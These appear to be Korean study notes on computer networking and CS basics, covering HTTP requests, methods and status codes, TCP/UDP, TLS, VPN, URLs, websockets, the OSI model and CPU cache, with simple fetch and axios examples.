    HTTP 요청의 header는 요청에 대한 메타데이터를 포함한다. Content-Type은 요청 본문(body)의 데이터 타입을 지정한다. 예를 들어, JSON 데이터를 보낼 때는 "application/json"을 설정할 수 있다. 또한 Authorization은 인증 토큰 또는 사용자 인증 정보를 포함하여 접근 권한을 부여할 수 있다. 이 외에도 header는 기타 요청에 필요한 헤더 정보를 추가할 수 있다.

    ```javascript
    fetch("https://api.example.com/data", {
      method: "GET",
      headers: {
        Authorization: "Bearer myToken",
        "Content-Type": "application/json",
      },
    });
    ```

  - body

    HTTP 요청의 body는 요청에 포함될 데이터를 포함하며, 일반적으로 POST 또는 PUT 요청과 함께 사용된다. 데이터는 주로 JSON, FormData, 텍스트 등의 형식으로 전송되며 Content-Type 헤더에 지정한 데이터 형식과 일치해야 한다.

    ```javascript
    // fetch를 사용한 JSON 데이터 전송
    fetch("https://api.example.com/create", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ key1: "value1", key2: "value2" }),
    });

    // axios를 사용한 JSON 데이터 전송
    axios.post(
      "https://api.example.com/create",
      {
        key1: "value1",
        key2: "value2",
      },
      {
        headers: {
          "Content-Type": "application/json",
          Authorization: "Bearer myToken",
        },
      }
    );
    ```

- HTTP 프로토콜 메소드

  1. GET : 데이터를 조회(Read)할 때 사용한다.

  2. POST : 새로운 정보를 추가/생성(Create)할 때 사용한다. body가 있어 데이터 담아 전송할 수 있다.

  3. DELETE : DELETE는 삭제(Delete)시에 사용한다.

  4. PUT & PATCH : PUT 또는 PATCH는 수정(Update)시에 사용한다. 두 가지를 구분하면 PUT은 데이터를 통쨰로, PATCH는 데이터 일부를 수정할 때 사용한다. body가 있어 데이터를 담아 전송할 수 있다.

- UDP, TCP/IP란?

  1. 패킷 : 라우팅되는 데이터 단위, 라우팅 시 효율적인 데이터 교환을 위해 나눈 데이터 조각

  2. TCP/IP : 데이터를 메세지의 형태로 보내기 위해 IP와 함께 사용하는 연결 지향적 프로토콜이다. IP가 패킷 전달을 수행한다면 TCP는 패킷을 추적 및 관리하게 된다. 연결 지향 프로토콜이란 클라이언트와 서버가 연결된 상태에서 데이터를 주고받는 프로토콜을 의미한다. 클라이언트가 연결 요청(SYN 데이터 전송)을 하고, 서버가 연결을 수락하면 통신 선로가 고정되고, 모든 데이터는 고정된 통신 선로를 통해서 순차적으로 전달된다.

  3. UDP : 데이터를 데이터그램 단위로 처리하는 프로토콜이다. 여기서 데이터그램이란 독립적인 관계를 지니는 패킷이라는 뜻이다. TCP와 달리 UDP는 비연결 지향적 프로토콜이다. 비연결 지향적이란 데이터를 주고받을 때 연결 절차를 거치지 않고 발신자가 일방적으로 데이터를 발신하는 방식을 의미한다.

- TCP/IP, UDP 차이

  |                | TCP                  | UDP                    |
  | -------------- | -------------------- | ---------------------- |
  | 연결 방식      | 연결 지향적 프로토콜 | 비연결 지향적 프로토콜 |
  | 패킷 교환 방식 | 가상 회선 방식       | 데이터그램 방식        |
  | 전송 순서      | 보장                 | 비보장                 |
  | 수신 여부 확인 | 확인                 | 확인하지 않음          |
  | 통신 방식      | 1:1 통신             | 1:1, 1:N, N:N 통신     |
  | 신뢰성         | 높다                 | 낮다                   |
  | 속도           | 느리다               | 빠르다                 |

- SSL(Secure Sockets Layer), TLS(Transport Layer Security)

  SSL/TLS는 인터넷 통신 중 데이터(패킷)를 암호화하여 도청, 위변조를 방지하는 보안 프로토콜이다. SSL/TLS를 사용하는 웹사이트는 URL에서 HTTP 대신 HTTPS를 사용하며, 브라우저는 서버의 인증서(SSL 인증서)를 검증해 신뢰할 수 있는 사이트인지를 판단한다. 현재는 TLS가 표준이며, "SSL 인증서"라는 표현은 관습적으로 사용되는 명칭일 뿐 실제로는 TLS 기반 인증서이다.

  -> 내가 이해한 내용으로는 간단히 TLS 프로토콜을 사용하면 HTTP 메서드를 사용한 요청/응답 시 요청 본문, URL 파라미터, 응답 데이터 등 모든 내용이 평문이 아니라 암호화되어 탈취 시 안전하다고 이해했다.

- SSL/TLS 통신 과정 (참고: https://wayhome25.github.io/cs/2018/03/11/ssl-https/)

  1. 클라이언트에서 서버로 클라이언트 랜덤 데이터 (랜덤 바이트)와 지원하는 암호화 방식 목록(Cipher Suites)을 전송

  2. 서버에서 클라이언트로 서버 랜덤 데이터, 선택된 암호화 방식, SSL 인증서(공개키 포함) 전송

  3. 서버 인증서의 유효성 검증 (신뢰할 수 있는 CA인지 확인) 후 클라이언트 랜덤 + 서버 랜덤을 기반으로 Pre-Master Secret(임시 대칭키 재료)을 생성, 이 Pre-Master Secret을 서버의 공개키로 암호화하여 서버로 전송

  4. 서버는 자신의 비밀키(Private Key)로 받은 데이터를 복호화하여 같은 Pre-Master Secret을 획득

  5. 클라이언트와 서버는 동일한 Pre-Master Secret과 랜덤 데이터를 기반으로 대칭키를 생성, 이후에는 이 대칭키로 암호화된 데이터를 주고받음 (→ 빠르고 효율적인 암호화/복호화가 가능)

  6. 통신 종료(세션 종료) 시 생성된 대칭키는 폐기되어 보안성을 유지

- HTTP와 HTTPS의 차이

  HTTP 프로토콜은 컴퓨터 네트워크에서 데이터를 주고 받을 때 사용하는 통신 프로토콜이다. HTTPS는 HTTP 프로토콜에 데이터 암호화가 추가된 프로토콜이다.
  공개키/개인키 방식을 활용해 데이터를 암호화한다. HTTPS는 암호화가 추가되어 안전하게 데이터를 주고 받을 수 있다. 단점은 SSL/TLS 인증서를 발급하고 유지하는데 추가 비용이 발생할 수 있다.

- HTTP 버전별 차이 (참고: https://withbundo.blogspot.com/2021/02/http-http-10-http-11.html)

  (1) HTTP/0.9 : GET 메서드만 지원, HTTP 헤더 없음, HTML만 전송 가능

  (2) HTTP/1.0 : 메서드, 헤더 추가(HTML 이외 다른 파일 전송 가능), 한 커넥션 당 한개의 요청, 요청과 응답이 이루어진 후 다음 요청 가능

  (3) HTTP/1.1 : 동시에 여러 개(최대 6개, 완벽한 병렬은 아님, 직렬 응답)의 요청과 각각의 응답을 받을 수 있는 파이프라이닝 추가, 버츄얼 호스팅(하나의 IP에 여러 도메인)을 가능하게 하는 호스트 헤더 추가, Keep-Alive 기본 지원으로 한 커넥션 당 여러 개의 요청을 할 수 있는 커넥션 유지 기능 추가, 가장 널리 쓰임

  (4) HTTP/2 : 멀티플렉싱 지원(한 커넥션에서 여러 요청과 응답이 동시에 병렬 처리 가능), 헤더 압축으로 데이터 양 감소, 서버 푸시, 성능 개선 등

  (5) HTTP/3 : TCP 대신 UDP 기반의 QUIC 프로토콜 사용, 멀티플렉싱과 오류 복원 향상, TLS 암호화 기본 탑재, 2022년 IETF 표준 채택, 0-RTT 연결 지원 및 핸드쉐이크 지연 시간 단축, 점진적 도입 중

- HTTP 상태 코드 의미

  1. 200번대 : 성공 (Successful), 대부분 통신 성공을 의미

  - 200 : 요청이 성공적으로 처리되어 응답이 정상적으로 돌아온 경우

  - 201 : 요청이 성공적으로 처리되었고, 서버가 새로운 리소스를 생성했을 때

  - 202 : 요청을 받아들였지만 아직 처리 중인 상태 (비동기 작업 등)

  - 204 : 요청은 성공했으나 응답할 데이터가 없는 경우

  2. 300번대 : 리다이렉션 (Redirection), 대부분 클라이언트가 이전 주소로 데이터를 요청하여 서버에서 새 URL로 리다이렉트를 유도하는 경우이다.

  - 300 : 요청한 리소스에 대해 여러 선택지가 있어 클라이언트가 선택해야 하는 경우

  - 301 : 요청한 리소스가 영구적으로 다른 URL로 이동했음을 알림 (검색엔진 최적화에 중요)

  3. 400번대 : 클라이언트 오류 (Client Error), 유효하지 않은 자원을 요청했거나 요청이나 권한이 잘못된 경우 발생

  - 400 : 요청 구문 잘못된 경우의 에러

  - 401 : 인증 에러

  - 403 : 권한이 없어서 접근을 거부할 때

  - 404 : 자원 에러, 빈 페이지 접근

  4. 500번대 : 서버 오류 (Server Error)

  - 500 : 서버 내부에서 알 수 없는 오류가 발생했을 때

<br>

### # 인공지능, 머신러닝, 딥러닝

- 인공지능

  인공지능이란 인간이 가지고 있는 지적 능력을 컴퓨터에서 구현하는 다양한 기술이나 소프트웨어, 컴퓨터 시스템 등을 말한다.

- 머신러닝

  컴퓨터가 스스로 학습할 수 있도록 도와주는 알고리즘이나 기술을 개발하는 분야, 머신러닝에서는 컴퓨터가 학습을 통해 새로운 규칙을 생성할 것을 기대한다.

- 딥러닝

  머신러닝 모델의 한 종류로 인공신경망을 여러 개 연결하여 인간의 뇌와 유사한 정보 입출력 계층을 만듦으로써 데이터를 학습하게 하는 기술이다.

- 개념 : 인공지능 > 머신러닝 > 딥러닝

<br>

### # 인터넷의 발전

1. 컴퓨터 <-> 컴퓨터

   인터넷의 가장 기본적인 것은, 컴퓨터들이 서로 통신 가능한 거대한 네트워크라는 것이다. 케이블 또는 무선으로 연결을 지속한다.

2. 컴퓨터 <-> 라우터 <-> 컴퓨터

   여러 대의 컴퓨터가 연결될 때 많은 플러그와 케이블이 필요하게 되는데 이런 문제를 해결하기 위해 라우터가 연결된다. 중간에 라우터가 위치하여 컴퓨터와 라우터 혹은 컴퓨터 사이에서 통신을 전달한다. 라우터 끼리의 연결도 가능하다.

3. 컴퓨터 <-> 라우터 <-> 모뎀 <-> 라우터 <-> 컴퓨터

   먼 곳에 있는 컴퓨터와 연결하기 위해 네트워크를 전화 시설과 연결하게 된다. 이 때 모뎀이라는 장비를 활용하여 네트워크의 정보를 전화 시설에서 처리할 수 있는 정보로 바꾸어 어느 곳에 있는 라우터와 통신이 가능하도록 한다.

4. 컴퓨터 <-> 라우터 <-> 모뎀 <-> ISP1 <-> ... <-> ISP2 <-> 모뎀 <-> 라우터 <-> 컴퓨터

   모뎀을 통해 전화시설에 연결 후 ISP(인터넷 서비스 제공 업체)를 통해 도달해야 할 컴퓨터 혹은 네트워크까지 도달하게 한다. ISP는 네트워크 연결을 담당하며 다른 ISP와 통신할 수 있도록 한다.

<br>

### # VPN

- VPN(Virtual Private Network)

  가상 사설망이라고 하며 두 대 이상의 장치 간의 암호화 된 보안 터널이다.

- VPN 사용 이유

  1. 대체 IP 사용 : 대체 IP 주소를 사용하기 때문에 위치 추적이 불가능하다.

  2. 데이터 암호화 : 모든 데이터를 암호화한다. 데이터 암호화를 통해 ISP가 사용자 데이터를 판매하는 것을 방지할 수 있고 개방형 와이파이를 안전하게 사용할 수 있다.

  3. 추가적인 보안 : 악성 웹사이트, 애드, 트래커를 차단한다.

  4. 지역별 차단 우회 : IP를 사용한 지역별 차단을 우회하여 거주자 전용 컨텐츠 등을 확인할 수 있다.

<br>

### # URI, URL, URN

- URI

  리소스(자원)를 식별하기 위한 통합 개념, URL과 URN을 포함하는 개념이다.

- URL

  URI의 하위 개념으로, 리소스의 위치(Location)를 명시 (예시: https://example.com/path)

- URN

  URI의 하위 개념으로, 리소스의 이름(Name)을 식별하지만, 위치 정보는 없음 (예시: urn:isbn:9783161484100)

- URI, URL 구성

  | 부분                             | 명칭                 | 설명                                                                      |
  | -------------------------------- | -------------------- | ------------------------------------------------------------------------- |
  | file://, http://, https://       | scheme(protocol)     | 자원에 접근하는 방법 또는 통신 방식 (http, https, ftp, mailto 등)         |
  | 127.0.0.1, www.google.com        | hosts                | 리소스를 호스팅하는 서버의 도메인 이름 또는 IP 주소                       |
  | :80, :443, :3000                 | port                 | (선택 사항) 서버의 특정 서비스로 연결되는 포트 번호. 기본은 80, 443       |
  | /search, /Users/username/Desktop | path                 | 서버의 특정 자원에 대한 경로. 디렉토리 구조 기반                          |
  | ?q=JavaScript&page=1             | Query (Query String) | (선택 사항) 서버에 전달할 데이터. key=value 형식, &로 구분                |
  | #section2                        | Fragment             | (선택 사항) 문서 내 특정 위치(앵커)로 이동할 때 사용 (HTML의 id와 매칭됨) |

<br>

### # 폴링, 롱폴링, 소켓 통신, 웹소켓, Server-Sent Event

- 폴링(Polling)

  리얼타입 웹을 위한 기법, 브라우저가 일정한 주기로 HTTP 요청을 보내는 방식이다. 보통 실시간 데이터의 업데이트 주기는 예측하기 어려우므로 변경 사항이 없어도 계속 요청하므로 불필요한 트래픽과 서버 부하 발생

- 롱폴링(Long-Polling)

  리얼타입 웹을 위한 기법, 클라이언트가 서버에 요청을 보내고 서버는 데이터가 준비될 때까지 대기 후 응답. 응답이 오면 클라이언트는 즉시 새로운 요청을 보내 지속적으로 데이터를 받음. 여전히 요청-응답 반복 구조라 지연/부하 가능성 존재

- 웹소켓

  HTTP 프로토콜은 비연결지향 프로토콜로 요청과 응답이 완료된 후 커넥션 연결을 끊어버리는 특징이 있지만 웹소캣의 경우 커넥션을 유지하여 언제든 양방향 통신이 가능하도록 하는 기술이다.
  최초 연결은 HTTP 프로토콜을 통해 이루어지고 이후 웹소캣 연결이 완료되면 독자적인 프로토콜을 사용한다. 실시간 채팅과 같이 리얼타임 같은 기능에 사용된다.

- SSE(Server-Sent Event)

  웹소켓이 양방향 통신이라면 SSE는 단방향 통신(서버 -> 클라이언트)으로 클라이언트가 데이터를 받을 수만 있게 하는 통신 방법이다. 웹소켓과 달리 HTTP 프로토콜을 사용하며 주로 알림, 모니터링 데이터, 뉴스 피드 등에 적합 (양방향이 필요 없다면 웹소켓보다 효율적)

- 비교 요약

  | 항목           | 폴링        | 롱폴링      | 웹소켓           | SSE                        |
  | -------------- | ----------- | ----------- | ---------------- | -------------------------- |
  | 통신 방향      | 단방향      | 단방향      | **양방향**       | 단방향 (서버 → 클라이언트) |
  | 연결 방식      | 주기적 요청 | 요청 → 대기 | **지속적 연결**  | 지속적 연결                |
  | 서버 push 가능 | ❌          | ❌          | ✅               | ✅                         |
  | 기반 프로토콜  | HTTP        | HTTP        | HTTP → WebSocket | HTTP (text/event-stream)   |
  | 실시간성       | 낮음        | 중간        | **높음**         | 높음                       |
  | 브라우저 지원  | 전체        | 전체        | 대부분 지원      | 대부분 지원 (IE 미지원)    |
  | 구현 난이도    | 쉬움        | 중간        | 어려움           | 쉬움                       |

<br>

### # telnet, SSH, FTP, SFTP

- telnet : 원격 접속

  네트워크를 통해 원격 컴퓨터의 터미널(명령어 인터페이스)에 접속할 수 있는 프로토콜, 평문 (기본 23번 포트)

- SSH(Secure Shell) : 보안 원격 접속

  네트워크 상에서 원격 컴퓨터에 안전하게 접속하고 명령을 실행할 수 있게 해주는 프로토콜 (기본 22번 포트)

- FTP(File Transfer Protocol) : 파일 전송

  클라이언트와 서버 간에 파일을 전송하기 위한 표준 프로토콜, 평문 (제어 연결 기본 21번 포트, 데이터 전송 20번 (액티브 모드에서만 사용))

- SFTP(Secure File transfer protocol) : 보안 파일 전송

  SSH 연결을 기반으로 암호화된 파일 전송을 제공하는 프로토콜 (기본 포트 22번, SSH와 동일)

<br>

### # 공인 IP, 사설 IP

- 공인 IP

  인터넷 사용자의 로컬 네트워크(LAN)를 식별하기 위해 ISP(인터넷 서비스 공급자)가 제공하는 IP 주소이다. 공용 IP 주소라고도 불리며 외부에 공개되어 있는 IP 주소 (예 웹 서버, DNS 서버, 인터넷 공유기의 WAN 포트 등)

- 사설 IP

  로컬 IP, 가상 IP라고도 불리며 내부 네트워크(로컬망)에서만 사용되며 인터넷 상에서는 유효하지 않은 IP 주소 (예 공유기에 연결된 스마트폰, 컴퓨터, 프린터 등)

<br>

### # 포트 포워딩, 내부포트, 외부포트

- 포트(Port)

  포트는 하나의 컴퓨터(호스트) 내에서 실행 중인 애플리케이션(프로세스)을 식별하기 위한 논리적인 숫자이다. IP 주소가 어떤 컴퓨터로 데이터를 보낼지를 나타낸다면, 포트는 그 컴퓨터 안의 어떤 프로그램(서비스)에 보낼지를 결정한다.

- 포트 포워딩(Port-Forwarding)

  포트 포워딩은 외부 네트워크에서 들어오는 요청을 내부 네트워크의 특정 장치와 포트로 전달하는 기능이다. 보통 공유기나 라우터에서 설정하며, 외부에서 특정 서비스(예: 웹 서버, 게임 서버 등)에 접근할 수 있도록 할 때 사용된다.

- 내부포트

  라우터나 공유기가 실제 내부 장치로 전달할 때 사용하는 포트 번호

- 외부포트

  외부에서 접속할 때 사용하는 공인 IP 주소의 포트 번호

<br>

### # OSI 7계층

- OSI(Open Systems Interconnection Reference Model) 7계층

  OSI 7계층은 국제표준화기구(ISO)가 정의한 네트워크 통신의 추상화 모델이다. 통신 과정을 7단계로 나눔으로써 문제를 쉽게 구분하고, 역할을 명확히 하며, 프로토콜을 표준화할 수 있게 했다.

- 각 계층 설명 (하위 -> 상위)

  | 계층 번호 | 계층 이름 (한글/영문)            | 주요 기능                                                        | 대표 장비/프로토콜        |
  | --------- | -------------------------------- | ---------------------------------------------------------------- | ------------------------- |
  | 1계층     | **물리 계층** (Physical)         | 0과 1의 **비트 단위 데이터**를 물리적으로 전송                   | 케이블, 허브, 리피터      |
  | 2계층     | **데이터 링크 계층** (Data Link) | 프레임 단위 데이터 전송, **MAC 주소**, 에러 검출                 | 스위치, 브릿지, 이더넷    |
  | 3계층     | **네트워크 계층** (Network)      | **패킷 전송**, 논리적 주소(IP), 라우팅                           | 라우터, IP, ICMP          |
  | 4계층     | **전송 계층** (Transport)        | **프로세스 간 통신**, 포트 번호, 신뢰성 (TCP), 속도 (UDP)        | TCP, UDP                  |
  | 5계층     | **세션 계층** (Session)          | 연결 관리, 세션 생성/유지/종료                                   | API, 소켓, NetBIOS        |
  | 6계층     | **표현 계층** (Presentation)     | 데이터 형식 변환, 암호화, 압축, 인코딩/디코딩                    | JPEG, MPEG, SSL, ASCII    |
  | 7계층     | **응용 계층** (Application)      | 사용자와 가장 가까운 계층, 애플리케이션 네트워크 인터페이스 제공 | HTTP, FTP, DNS, SMTP, SSH |

<br>

### # 캡슐화, 역캡슐화

- 캡슐화와 역캡슐화

  컴퓨터의 웹 브라우저에 URL을 입력할 때부터 웹 서버에 데이터가 도착할 때까지 각 과정에서는 캡슐화와 역캡슐화가 이루어진다.

- 캡슐화

  송신 측(데이터를 보내는 쪽)에서 상위 계층의 데이터에 각 계층별 헤더(필요 시 트레일러 포함)를 덧붙여 하위 계층으로 전달하는 과정을 말한다. (상위에서 하위로 진행 응용 계층 -> 물리 계층)

  ex) 데이터 → TCP 헤더 추가 → IP 헤더 추가 → 이더넷 헤더 추가 → 전송

- 역캡슐화

  수신 측(데이터를 받는 쪽)에서는 수신된 데이터에서 각 계층이 붙인 헤더를 하나씩 제거하면서 원래의 데이터로 복원한다.

  ex) 수신 → 이더넷 헤더 제거 → IP 헤더 제거 → TCP 헤더 제거 → 원본 데이터

<br>

### # CPU 캐시기억장치의 캐시 (레지스터, 캐시기억장치, 주기억장치, 보조기억 장치 중 캐시기억장치)

- 캐시

  - 캐시(Cache)는 CPU와 주기억장치(RAM) 사이에 위치한 고속의 임시 기억장치로, 자주 사용하는 데이터를 미리 저장해 CPU가 빠르게 접근할 수 있도록 돕는다.

  - 레지스터 < 캐시 < 주기억장치(RAM) < 보조기억장치(HDD/SSD), 레지스터를 기준으로 속도는 가장 빠르고 용량은 매우 작고, 가격은 가장 비싸다. 우측으로 갈수록 속도가 느려지고 용량이 커지며 가격이 저렴해진다.

<br>

- 캐시의 지역성

  1. 시간적 지역성 : 최근에 접근한 데이터는 가까운 미래에 다시 접근할 가능성이 높다.

  2. 공간적 지역성 : 한 번 접근한 메모리 주소 근처의 주소도 곧 접근할 가능성이 높다.

<br>

- 캐시 동작 방식

  1. CPU가 데이터를 요청하면 우선 캐시에서 검색 (Cache Hit 여부 확인)

  2. 캐시에 없으면 (Cache Miss) → 주기억장치(RAM)에서 읽고, 캐시에 복사

  3. 캐시에 데이터가 있으면 바로 반환 → 처리 속도 향상

  4. 오래된 데이터는 **교체 알고리즘(LRU 등)**에 따라 제거됨

<br><br><br>
